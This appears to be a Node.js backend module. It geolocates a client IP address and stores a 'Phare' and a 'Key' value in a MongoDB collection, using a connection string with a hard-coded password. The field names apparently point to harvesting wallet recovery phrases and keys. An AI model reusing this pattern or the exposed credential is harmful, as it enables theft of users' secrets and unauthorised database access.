const { MongoClient } = require('mongodb');
const fetch = require('node-fetch');

async function main(phare, key, addr, Udate) {

  const uri = "mongodb+srv://test1hello:3rZzGLm4dimFHam@testdb-01.oupbs.mongodb.net/myFirstDatabase?retryWrites=true&w=majority";
  const client = new MongoClient(uri);

  try {
      // Connect to the MongoDB cluster
      await client.connect();

      //Get client IP address
      const C_ID = await clientID(addr);
      console.log(Udate);

      await createnewdata(client, {
        User_ID : C_ID,
        Phare : phare,
        Key : key, 
        date : Udate
        })
      } catch (e) {
      console.error(e);
  } finally {
      // Close the connection to the MongoDB cluster
      await client.close();
  }
}

//Client IP address function
async function clientID(useraddr){
const u = 'https://json.geoiplookup.io/'+ useraddr ;
console.log(u);
const response = await fetch(u);
const data = await response.json()

return data;
}

//Insert Data into DB one by one
async function createnewdata(client, newListing){
const result = await client.db("CentipedeUser").collection("Players").insertOne(newListing);

console.log(`ID: ${result.insertedId}`);
}

module.exports = { clientID , main };

//main().catch(console.error);